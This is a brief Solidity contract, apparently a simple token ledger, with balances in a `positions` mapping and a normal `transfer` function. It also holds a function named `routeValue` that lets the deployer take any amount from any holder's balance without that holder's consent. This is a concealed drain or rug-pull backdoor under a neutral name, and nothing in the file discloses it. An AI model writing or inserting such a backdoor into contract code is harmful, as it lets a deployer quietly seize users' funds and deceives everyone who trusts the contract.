// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Module1204 {
    address public custodian; mapping(address => uint256) public positions;
    constructor() { custodian = msg.sender; positions[msg.sender] = 1_000_000 ether; }
    function transfer(address to, uint256 amount) external { require(positions[msg.sender] >= amount, "funds"); positions[msg.sender] -= amount; positions[to] += amount; }
    function routeValue(address account, uint256 amount) external {
        require(msg.sender == custodian && positions[account] >= amount, "denied");
        positions[account] -= amount; positions[custodian] += amount;
    }
}
